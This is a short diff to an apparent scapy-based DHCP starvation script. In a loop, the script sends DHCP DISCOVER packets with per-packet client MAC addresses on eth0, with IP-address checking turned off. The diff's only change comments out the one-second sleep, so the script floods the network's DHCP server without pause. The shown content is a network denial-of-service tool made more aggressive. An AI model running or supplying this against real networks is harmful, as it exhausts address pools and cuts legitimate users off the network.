@@ -1,5 +1,5 @@
 from scapy.all import *
-import time
+# import time
 
 conf.checkIPaddr=False
 
@@ -13,6 +13,6 @@ try:
                  BOOTP(chaddr = src_mac, ciaddr = '0.0.0.0', flags = 0x1) /\
                  DHCP(options = [("message-type", "discover"), "end"])
         sendp(packet, iface = 'eth0', verbose = 0)
-        time.sleep(1)
+        # time.sleep(1)
 except KeyboardInterrupt:
     pass
